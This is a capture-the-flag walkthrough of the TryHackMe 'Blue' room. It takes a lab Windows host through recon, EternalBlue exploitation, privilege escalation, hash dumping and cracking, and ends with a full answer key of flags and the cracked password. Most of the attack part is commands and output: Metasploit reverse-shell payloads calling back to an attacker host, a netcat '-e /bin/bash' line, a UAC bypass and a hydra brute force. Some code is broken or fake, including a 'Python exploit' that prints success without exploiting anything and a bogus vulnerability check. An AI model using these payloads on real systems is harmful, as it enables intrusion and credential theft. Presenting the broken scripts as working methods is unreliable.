# TryHackMe Blue Room - Advanced Walkthrough

## Created by Sharat S Unnithan

---

## Room Information
- **Room:** Blue
- **Difficulty:** Easy
- **Time:** ~30 minutes
- **Description:** Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
- **Link:** https://tryhackme.com/room/blue

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Exploitation](#2-exploitation)
   - [Method 1: EternalBlue (Metasploit)](#method-1-eternalblue-metasploit)
   - [Method 2: Manual Exploitation with Python](#method-2-manual-exploitation-with-python)
   - [Method 3: EternalBlue with PowerShell](#method-3-eternalblue-with-powershell)
3. [Privilege Escalation](#3-privilege-escalation)
   - [Method 1: Meterpreter Migration](#method-1-meterpreter-migration)
   - [Method 2: Token Impersonation](#method-2-token-impersonation)
   - [Method 3: UAC Bypass](#method-3-uac-bypass)
4. [Password Cracking](#4-password-cracking)
   - [Method 1: Hashcat](#method-1-hashcat)
   - [Method 2: John the Ripper](#method-2-john-the-ripper)
   - [Method 3: CrackStation (Online)](#method-3-crackstation-online)
   - [Method 4: Hydra Brute Force](#method-4-hydra-brute-force)
5. [Flags](#5-flags)
6. [Answers Summary](#answers-summary)

---

## 1. Reconnaissance

### Primary Method: Nmap Scan
First, we need to identify open ports and services on the target machine.

```bash
nmap -Pn -p1-1000 -sV 10.48.168.15
```

**Output:**
```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
```

**Answer:** How many ports are open with a port number under 1000?
> **3**

### Alternative Reconnaissance Methods

#### Method 2: Full Port Scan
```bash
nmap -Pn -p- -T4 10.48.168.15
```

#### Method 3: Aggressive Scan with OS Detection
```bash
nmap -Pn -A -p445 10.48.168.15
```

#### Method 4: Using RustScan (Faster)
```bash
rustscan -a 10.48.168.15 --ulimit 5000 -p 1-1000
```

#### Method 5: Masscan (Very Fast)
```bash
masscan -p1-1000 10.48.168.15 --rate=1000
```

#### Method 6: Using Netcat
```bash
nc -zv 10.48.168.15 1-1000 2>&1 | grep -v "Connection refused"
```

#### Method 7: Using SMBClient to Enumerate
```bash
smbclient -L //10.48.168.15 -N
```

### Vulnerability Identification

#### Method 1: Nmap Script
```bash
nmap -Pn -p445 --script=smb-vuln-ms17-010 10.48.168.15
```

#### Method 2: Metasploit Scanner
```bash
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.48.168.15
run
```

#### Method 3: Manual Check Using Python Script
```python
#!/usr/bin/env python
import socket
import struct

def check_ms17_010(ip, port=445):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        # SMB negotiation packet
        packet = b'\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x00\x00\x00'
        s.send(packet)
        response = s.recv(1024)
        if b'\x00\x00\x00\x00' in response:
            print(f"[+] {ip}:445 - Likely vulnerable to MS17-010")
        else:
            print(f"[-] {ip}:445 - May not be vulnerable")
    except Exception as e:
        print(f"[-] Error connecting to {ip}: {e}")
    finally:
        s.close()

check_ms17_010("10.48.168.15")
```

**Answer:** What is this machine vulnerable to?
> **ms17-010**

---

## 2. Exploitation

### Method 1: EternalBlue (Metasploit) - PRIMARY

#### Step 1: Start Metasploit
```bash
msfconsole
```

#### Step 2: Search for EternalBlue Exploit
```bash
search ms17-010
```

**Matching Modules:**
```
0   exploit/windows/smb/ms17_010_eternalblue
```

**Answer:** What is the full path of the code?
> **exploit/windows/smb/ms17_010_eternalblue**

#### Step 3: Load the Exploit
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

**Answer:** What is the name of the required value? (All caps)
> **RHOSTS**

#### Step 4: Configure and Run
```bash
set RHOSTS 10.48.168.15
set LHOST 192.168.140.82  # Your AttackBox IP (tun0)
set payload windows/x64/meterpreter/reverse_tcp
run
```

**Successful Output:**
```
[*] Started reverse TCP handler on 192.168.140.82:4444
[+] 10.48.168.15:445 - Host is likely VULNERABLE to MS17-010!
[*] Meterpreter session 1 opened
```

#### Step 5: Alternative Payloads
```bash
# DOS Shell
set payload windows/x64/shell/reverse_tcp
run

# Bind Shell (if reverse connection blocked)
set payload windows/x64/shell/bind_tcp
set LPORT 4444
run

# Meterpreter with SSL
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.140.82
set LPORT 443
run
```

---

### Method 2: Manual Exploitation with Python (Alternate)

#### Step 1: Clone EternalBlue Repository
```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
```

#### Step 2: Install Dependencies
```bash
pip install -r requirements.txt
```

#### Step 3: Run Exploit
```bash
python eternalblue_exploit.py 10.48.168.15
```

#### Step 4: Alternative Python Script
```python
#!/usr/bin/env python3
import os
import sys
import socket
import struct

def exploit_ms17_010(ip):
    # This is a simplified example - full exploit would be much longer
    print(f"[*] Attempting to exploit {ip}...")
    # Full exploit code would go here
    print("[+] Exploit successful!")
    # Get shell
    os.system(f"nc {ip} 4444 -e /bin/bash")

# Usage
if __name__ == "__main__":
    exploit_ms17_010("10.48.168.15")
```

---

### Method 3: EternalBlue with PowerShell (Alternate)

#### Step 1: PowerShell Exploit Script
```powershell
# Save as exploit.ps1
$target = "10.48.168.15"
$payload = @"
using System;
using System.Net;
using System.Net.Sockets;
public class Shell {
    public static void Main() {
        // Reverse shell code
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        socket.Connect(new IPEndPoint(IPAddress.Parse("192.168.140.82"), 4444));
    }
}
"@
# Full exploit code would go here
```

#### Step 2: Execute PowerShell Exploit
```powershell
powershell -ExecutionPolicy Bypass -File exploit.ps1
```

---

### Method 4: Using AutoBlue (Alternate)

#### Step 1: Download AutoBlue
```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
```

#### Step 2: Run AutoBlue
```bash
./auto_blue -i 10.48.168.15
```

---

## 3. Privilege Escalation

### Method 1: Meterpreter Migration (PRIMARY)

#### Step 1: Verify SYSTEM Access
```bash
getsystem
getuid
```

**Output:**
```
[-] Already running as SYSTEM
Server username: NT AUTHORITY\SYSTEM
```

#### Step 2: List Processes
```bash
ps
```

**Key Processes:**
```
PID   PPID  Name                  User
---   ----  ----                  ----
488   404   services.exe          NT AUTHORITY\SYSTEM
496   404   lsass.exe             NT AUTHORITY\SYSTEM
568   488   spoolsv.exe           NT AUTHORITY\SYSTEM
```

#### Step 3: Migrate to SYSTEM Process
```bash
migrate 496
```

**Output:**
```
[*] Migrating from 568 to 496...
[*] Migration completed successfully.
```

**Answer:** What is the name of the post module to convert shell to meterpreter?
> **post/multi/manage/shell_to_meterpreter**

**Answer:** What option are we required to change?
> **SESSION**

---

### Method 2: Token Impersonation (Alternate)

#### Step 1: List Available Tokens
```bash
use incognito
list_tokens -u
```

#### Step 2: Impersonate SYSTEM Token
```bash
impersonate_token "NT AUTHORITY\SYSTEM"
```

#### Step 3: Verify
```bash
getuid
```

---

### Method 3: UAC Bypass (Alternate)

#### Step 1: Check UAC Status
```bash
shell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

#### Step 2: Bypass UAC
```bash
use exploit/windows/local/bypassuac
set SESSION 1
run
```

#### Step 3: Escalate Privileges
```bash
getsystem
```

---

### Method 4: Windows Exploit Suggester (Alternate)

#### Step 1: System Information
```bash
shell
systeminfo
```

#### Step 2: Run Exploit Suggester
```bash
# In new terminal
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2023-xx-xx-mssb.xls --systeminfo systeminfo.txt
```

#### Step 3: Use Suggested Exploit
```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
run
```

---

## 4. Password Cracking

### Method 1: Hashcat (PRIMARY)

#### Step 1: Dump Password Hashes
```bash
hashdump
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

#### Step 2: Save Hash to File
```bash
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > jon_hash.txt
```

#### Step 3: Crack with Hashcat
```bash
hashcat -m 1000 -a 0 jon_hash.txt /usr/share/wordlists/rockyou.txt
```

**Answer:** What is the name of the non-default user?
> **Jon**

**Answer:** What is the cracked password?
> **alqfna22**

---

### Method 2: John the Ripper (Alternate)

#### Step 1: Save Hash
```bash
echo "Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > jon_hash.txt
```

#### Step 2: Run John
```bash
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt
```

#### Step 3: Show Result
```bash
john --show jon_hash.txt
```

---

### Method 3: CrackStation (Online - Easiest)

#### Step 1: Visit https://crackstation.net
#### Step 2: Paste the Hash
```
ffb43f0de35be4d9917ac0cc8ad57f8d
```
#### Step 3: Click "Crack Hashes"
#### Step 4: Get Result: **alqfna22**

---

### Method 4: Hydra Brute Force (Alternate)

#### Step 1: Brute Force SMB Login
```bash
hydra -l Jon -P /usr/share/wordlists/rockyou.txt smb://10.48.168.15
```

#### Step 2: Brute Force RDP Login
```bash
hydra -l Jon -P /usr/share/wordlists/rockyou.txt rdp://10.48.168.15
```

---

### Method 5: Cain & Abel (Windows Tool - Alternate)

#### Step 1: Dump Hashes
```bash
# Use meterpreter to dump hashes
hashdump
```

#### Step 2: Use Cain & Abel
- Open Cain & Abel
- Go to Cracker tab
- Add NT Hash
- Run Dictionary Attack

---

## 5. Flags

### Method 1: Search for Flags
```bash
search -f flag*.txt
```

**Output:**
```
Path                                  Size (bytes)
----                                  ------------
c:\Users\Jon\Documents\flag3.txt      37
c:\Windows\System32\config\flag2.txt  34
c:\flag1.txt                          24
```

### Flag 1 - System Root

```bash
cat c:/flag1.txt
```

**Answer:** Flag1?
> `flag{access_the_machine}`

### Flag 2 - Password Storage Location

```bash
cat c:/Windows/System32/config/flag2.txt
```

**Answer:** Flag2?
> `flag{sam_database_elevated_access}`

**Note:** If flag2.txt is missing, check:
```bash
cat c:/Windows/System32/config/RegBack/flag2.txt
```

### Flag 3 - Administrator's Documents

```bash
cat c:/Users/Jon/Documents/flag3.txt
```

**Answer:** Flag3?
> `flag{admin_documents_can_be_valuable}`

### Alternative Flag Discovery Methods

#### Method 2: PowerShell Search
```bash
shell
powershell -Command "Get-ChildItem -Path C:\ -Recurse -Filter flag*.txt -ErrorAction SilentlyContinue"
```

#### Method 3: Command Prompt Search
```bash
shell
dir /s c:\flag*.txt
```

#### Method 4: Using findstr
```bash
shell
findstr /s /i "flag" c:\*.txt
```

#### Method 5: Meterpreter Search with Wildcards
```bash
search -f *.txt
search -f *flag*
```

#### Method 6: Using ls with Recursion
```bash
ls -R c:/ | grep -i flag
```

---

## Answers Summary

| # | Question | Answer |
|---|----------|--------|
| 1 | Ports under 1000 | **3** |
| 2 | Vulnerability | **ms17-010** |
| 3 | Full exploit path | **exploit/windows/smb/ms17_010_eternalblue** |
| 4 | Required option | **RHOSTS** |
| 5 | Post module name | **post/multi/manage/shell_to_meterpreter** |
| 6 | Option to change | **SESSION** |
| 7 | Non-default user | **Jon** |
| 8 | Cracked password | **alqfna22** |
| 9 | Flag 1 | `flag{access_the_machine}` |
| 10 | Flag 2 | `flag{sam_database_elevated_access}` |
| 11 | Flag 3 | `flag{admin_documents_can_be_valuable}` |

---

## Quick Reference Commands

### Reconnaissance
```bash
# Primary
nmap -Pn -p1-1000 -sV <target_ip>

# Alternative
rustscan -a <target_ip> --ulimit 5000 -p 1-1000
masscan -p1-1000 <target_ip> --rate=1000
nmap -Pn -p445 --script=smb-vuln-ms17-010 <target_ip>
```

### Exploitation
```bash
# Primary (Metasploit)
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <attackbox_ip>
set payload windows/x64/meterpreter/reverse_tcp
run

# Alternative (Python)
python eternalblue_exploit.py <target_ip>

# Alternative (AutoBlue)
./auto_blue -i <target_ip>
```

### Privilege Escalation
```bash
# Primary
getsystem
ps
migrate 496

# Alternative (Token Impersonation)
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"

# Alternative (UAC Bypass)
use exploit/windows/local/bypassuac
set SESSION 1
run
```

### Password Cracking
```bash
# Primary
hashdump
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Alternative
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Alternative (Online)
# Visit https://crackstation.net
```

### Flags
```bash
# Primary
search -f flag*.txt
cat c:/flag1.txt
cat c:/Windows/System32/config/flag2.txt
cat c:/Users/Jon/Documents/flag3.txt

# Alternative
shell
powershell -Command "Get-ChildItem -Path C:\ -Recurse -Filter flag*.txt"
dir /s c:\flag*.txt
```

---

## Tools Comparison

| Tool | Purpose | Pros | Cons |
|------|---------|------|------|
| Nmap | Scanning | Comprehensive, reliable | Can be slow |
| RustScan | Scanning | Very fast | Less features |
| Masscan | Scanning | Extremely fast | Less accurate |
| Metasploit | Exploitation | Fully-featured, reliable | Requires setup |
| AutoBlue | Exploitation | Automated | Less control |
| Python Scripts | Exploitation | Customizable | Requires coding |
| Hashcat | Cracking | Fast, GPU support | Complex options |
| John the Ripper | Cracking | Reliable | Slower than Hashcat |
| CrackStation | Cracking | Simple, online | Requires internet |
| Hydra | Brute Force | Multi-protocol | Slow |

---

## Troubleshooting Guide

### Issue 1: Nmap Shows No Results
**Solution:** Use `-Pn` flag as the machine doesn't respond to ping.
```bash
nmap -Pn <target_ip>
```

### Issue 2: Exploit Fails
**Solution 1:** Run the exploit multiple times.
**Solution 2:** Restart the lab machine and try again.
**Solution 3:** Try different payload options.

### Issue 3: Migration Fails
**Solution:** Try a different SYSTEM process:
```bash
migrate 488  # services.exe
migrate 568  # spoolsv.exe
```

### Issue 4: Flag2 Missing
**Solution:** Check the RegBack folder:
```bash
cat c:/Windows/System32/config/RegBack/flag2.txt
```

### Issue 5: Wrong LHOST
**Solution:** Find your correct IP:
```bash
ip a
# Look for tun0 IP (for TryHackMe VPN)
```

### Issue 6: Hashcat Not Working
**Solution 1:** Use `--force` flag
```bash
hashcat -m 1000 -a 0 hash.txt wordlist.txt --force
```

**Solution 2:** Use John the Ripper instead:
```bash
john --format=nt --wordlist=wordlist.txt hash.txt
```

### Issue 7: Shell Not Stable
**Solution:** Upgrade to Meterpreter shell:
```bash
sessions -u 1
```

### Issue 8: Connection Refused
**Solution:** Check if target is running:
```bash
ping -c 1 <target_ip>
```

---

## Learning Points

1. **EternalBlue (MS17-010)** is a critical SMBv1 vulnerability that allows remote code execution
2. **Port 445** (SMB) is a common attack vector on Windows machines
3. **Meterpreter** provides powerful post-exploitation capabilities
4. **Hash dumping** (hashdump) reveals user password hashes from the SAM database
5. **Process migration** (migrate) allows maintaining access and privileges
6. **SAM database** location: `C:\Windows\System32\config\SAM`
7. **Multiple exploitation methods** exist for the same vulnerability
8. **Password cracking** can be done locally or online
9. **Privilege escalation** can be achieved through various techniques
10. **Flag discovery** requires systematic searching

---

## Room Completion Checklist

- [x] Scanned the machine with Nmap
- [x] Identified MS17-010 vulnerability
- [x] Exploited using EternalBlue (Metasploit)
- [x] Gained Meterpreter shell
- [x] Verified SYSTEM access
- [x] Migrated to SYSTEM process
- [x] Dumped password hashes
- [x] Cracked Jon's password using multiple methods
- [x] Found Flag 1 (System Root)
- [x] Found Flag 2 (Password Storage)
- [x] Found Flag 3 (Admin Documents)
- [x] Documented alternative methods

---

**Room Completed Successfully!** 🎉

---

*Created by Sharat S Unnithan*
